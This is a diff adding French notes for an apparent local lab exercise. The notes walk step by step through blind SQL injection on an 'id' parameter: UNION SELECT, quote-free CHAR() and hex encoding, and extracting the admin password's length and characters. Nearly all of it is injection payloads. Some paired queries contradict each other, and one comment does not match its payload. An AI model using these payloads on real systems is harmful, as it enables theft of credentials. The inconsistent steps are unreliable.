@@ -1,1 +1,40 @@
-http://localhost/Exo3/?username=aze UNION SELECT 1,2 FROM users WHERE 1=1
+
+#On vérifie si une injection est possible. On ne peut pas utiliser de guillemet, mais des opérations arithmétiques sont possibles
+
+http://localhost/Exo3/?id=2-1
+
+#On détermine le nombre de champs que la requete renvoie
+
+http://localhost/Exo3/?id=1 ORDER BY 3 --> Erreur
+http://localhost/Exo3/?id=1 ORDER BY 2 --> OK, donc 2 champs
+
+#On utilise un id négatif qui ne sera probablement pas dans la table
+
+localhost/Exo3/?id=-1 UNION SELECT 1, 2 FROM users WHERE 1=1
+
+#Cela retourne un résultat positif. 
+#On cherche l'identifiant de l'admin 
+
+localhost/Exo3/?id=-1 UNION SELECT 1, 2 FROM users WHERE username=CHAR(97,100,109,105,110) AND id=1 --> Libre
+localhost/Exo3/?id=-1 UNION SELECT 1, 2 FROM users WHERE username=CHAR(97,100,109,105,110) AND id=1 --> Utilisé
+
+#L'admin possède l'identifiant 2
+
+localhost/Exo3/?id=-1 UNION SELECT 1, 2 FROM users WHERE id=2
+
+#Cela retourne un résultat positif.
+#On cherche la longueur du mot de passe
+
+localhost/Exo3/?id=-1 UNION SELECT 1, 2 FROM users WHERE id=2 AND CHAR_LENGTH(password)>2 --> Utilisé
+localhost/Exo3/?id=-1 UNION SELECT 1, 2 FROM users WHERE id=2 AND CHAR_LENGTH(password)>3 --> Libre
+
+#Le mot de passe a 3 caractères.
+#On commence à chercher le mot de passe en hexadécimal avec LIKE (0x25 correspond à '%')
+
+#On regarde si la première lettre est un 'a' (0x61)
+localhost/Exo3/?id=-1 UNION SELECT 1, 2 FROM users WHERE id=2 AND password LIKE 0x6d25 --> Libre
+localhost/Exo3/?id=-1 UNION SELECT 1, 2 FROM users WHERE id=2 AND password LIKE 0x6d25 --> Utilisé
+
+#La première lettre est un 'm' (0x6d)
+
+#On continue comme ca...
